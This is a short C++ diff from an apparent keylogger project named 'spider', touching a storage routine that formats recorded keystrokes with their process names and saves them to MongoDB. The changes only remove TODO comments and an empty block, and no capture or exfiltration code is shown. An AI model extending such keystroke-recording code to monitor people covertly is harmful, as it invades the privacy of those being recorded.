@@ -54,7 +54,6 @@ namespace spider
 
     void Storage::write()
     {
-      // TODO: Handle if unknown key / state / type
       static std::map<network::tcp::PacketEventState, std::string> const
           stateMap = {{network::tcp::PacketEventState::Down, "Down"},
                       {network::tcp::PacketEventState::Up, "Up"}};
@@ -309,11 +308,6 @@ namespace spider
 		        store.ev.key));
 		  }
 
-		if (store.ev.shift)
-		  {
-		    // TODO: Handle if shift is pressed
-		  }
-
 		msg += key + " - " + stateMap.at(store.ev.state) + " [" +
 		       reinterpret_cast<char const *>(
 		           store.ev.processName.data()) +
@@ -408,7 +402,6 @@ namespace spider
 	      break;
 	    }
 
-          //push document to mongoDB
 #if defined MONGOCXX
           bsoncxx::document::view view = doc_value.view();
           try
